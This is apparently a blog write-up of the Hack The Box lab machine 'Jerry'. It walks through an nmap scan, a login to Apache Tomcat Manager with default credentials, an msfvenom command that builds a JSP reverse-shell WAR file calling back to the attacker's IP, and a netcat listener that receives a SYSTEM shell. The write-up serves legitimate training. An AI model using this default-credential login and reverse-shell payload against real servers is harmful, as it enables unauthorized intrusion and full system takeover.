---
title: Hack The Box - Jerry
date: 2023-01-16 08:10:00
categories: [hackthebox]
tags: [windows,tomcat,easy]
math: true
mermaid: true
toc: true
comments: true
---
![](/assets/Hackthebox/Jerry/0.png)

## RECON

### NMAP

Starting with `nmap`, it only shows one port `8080 (Apache Tomcat)` open.

```bash
$sudo nmap -sC -sV -p- --min-rate 10000 -Pn -oN jerry-all-tcp.nmap 10.10.10.95 
Nmap scan report for 10.10.10.95
Host is up (0.092s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan 16 21:13:37 2023 -- 1 IP address (1 host up) scanned in 31.99 seconds
```

### PORT - 8080
Default install of tomcat.

![](/assets/Hackthebox/Jerry/1.png)

### Login
Using the default credentials `tomcat:s3cret` we can login to the Tomcat Manager Application.

![](/assets/Hackthebox/Jerry/1.png)

### EXPLOITINTG TOMCAT

Generating war file using `msfvenom`
```bash
$sudo msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.13 LPORT=4444 -f war > shell.war
```

## SHELL AS ADMINISTRATOR

Once we upload the war file and visit `http://10.10.10.95/shell` we get shell as `administrator`.
```bash
$sudo nc -lvnp 4444 
listening on [any] 4444 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.95] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system
```
